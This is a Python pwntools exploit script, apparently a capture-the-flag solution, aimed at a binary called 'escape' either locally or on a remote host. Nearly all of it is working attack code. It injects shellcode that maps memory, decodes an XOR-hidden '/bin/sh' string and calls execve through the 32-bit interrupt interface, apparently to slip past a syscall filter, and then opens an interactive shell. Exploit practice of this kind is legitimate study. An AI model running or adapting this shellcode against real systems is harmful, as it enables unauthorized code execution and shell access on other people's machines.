#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./escape', checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
gs = '''
set follow-fork-mode child
'''
context.arch = "amd64"

def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    elif args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))
    
    return p


p = init()
# xor rax, rax
# mov al, 57
# syscall

bin_sh = 0x40405000

shellcode = asm(
'''
xor eax, eax
xor ecx, ecx
mov edi, 0x40404040
mov al, 0x9
mov si, 0x1010
mov dl, 7 
xor r10, r10
mov r10b, 34
syscall
mov rcx, 0x1179623e7f78733e
mov rdx, 0x1111111111111111
xor rcx, rdx
mov esi, 0x40405050
mov esp, esi
push rcx
push rsp
pop rbx
xor rax, rax
xor rcx, rcx
xor rdx, rdx
mov al, 0xb
int 0x80
'''
)
p.sendlineafter(b"option: ", b"1")
p.sendlineafter(b"shellcode: ", shellcode) 
p.sendlineafter(b"option: ", b"2")


p.interactive()

